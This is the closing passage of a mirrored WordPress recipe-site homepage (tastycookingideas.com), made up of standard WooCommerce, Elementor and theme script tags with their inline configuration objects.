var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"View cart","cart_url":"https:\/\/tastycookingideas.com\/cart\/","is_cart":"","cart_redirect_after_add":"no"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min56be.js?ver=7.6.1' id='wc-add-to-cart-js'></script>
<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min44bd.js?ver=2.1.4-wc.7.6.1' id='js-cookie-js'></script>
<script type='text/javascript' id='woocommerce-js-extra'>
/* <![CDATA[ */
var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min56be.js?ver=7.6.1' id='woocommerce-js'></script>
<script type='text/javascript' id='wc-cart-fragments-js-extra'>
/* <![CDATA[ */
var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_539947ff277777047ea0ca8454e61863","fragment_name":"wc_fragments_539947ff277777047ea0ca8454e61863","request_timeout":"5000"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min56be.js?ver=7.6.1' id='wc-cart-fragments-js'></script>
<script type='text/javascript' src='wp-content/themes/freebook/assets/js/responsive-menu8a54.js?ver=1.0.0' id='responsive-menu-js'></script>
<script type='text/javascript' src='wp-content/themes/freebook/assets/js/jquery.ui.totop.min7359.js?ver=1.2.0' id='jquery-totop-js'></script>
<script type='text/javascript' src='wp-content/themes/freebook/inc/modules/woo/assets/js/woo-module-script8a54.js?ver=1.0.0' id='freebook-woo-module-script-js'></script>
<script type='text/javascript' src='wp-content/themes/freebook/assets/js/theme-script8a54.js?ver=1.0.0' id='freebook-theme-script-js'></script>
<script type='text/javascript' id='fifu-image-js-js-extra'>
/* <![CDATA[ */
var fifuImageVars = {"fifu_lazy":"","fifu_woo_lbox_enabled":"1","fifu_woo_zoom":"inline","fifu_is_product":"","fifu_is_flatsome_active":"","fifu_rest_url":"https:\/\/tastycookingideas.com\/wp-json\/","fifu_nonce":"790c9fda51"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/plugins/featured-image-from-url/includes/html/js/image5462.js?ver=4.2.6' id='fifu-image-js-js'></script>
<script type='text/javascript' src='wp-content/plugins/elementor/assets/js/webpack.runtime.min7ff8.js?ver=3.13.0' id='elementor-webpack-runtime-js'></script>
<script type='text/javascript' src='wp-content/plugins/elementor/assets/js/frontend-modules.min7ff8.js?ver=3.13.0' id='elementor-frontend-modules-js'></script>
<script type='text/javascript' src='wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min05da.js?ver=4.0.2' id='elementor-waypoints-js'></script>
<script type='text/javascript' src='wp-includes/js/jquery/ui/core.min3f14.js?ver=1.13.2' id='jquery-ui-core-js'></script>
<script type='text/javascript' id='elementor-frontend-js-before'>
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.13.0","is_static":false,"experimentalFeatures":{"e_dom_optimization":true,"e_optimized_assets_loading":true,"e_optimized_css_loading":true,"e_font_icon_svg":true,"a11y_improvements":true,"additional_custom_breakpoints":true,"container":true,"landing-pages":true},"urls":{"assets":"https:\/\/tastycookingideas.com\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":8,"title":"TastyCookingIdeas.com%20%E2%80%93%20Easy%20recipes%20for%20tasty%20meals%20every%20day","excerpt":"","featuredImage":false}};
</script>
<script type='text/javascript' src='wp-content/plugins/elementor/assets/js/frontend.min7ff8.js?ver=3.13.0' id='elementor-frontend-js'></script>
</body>

<!-- Mirrored from tastycookingideas.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 May 2023 19:24:05 GMT -->
</html> 
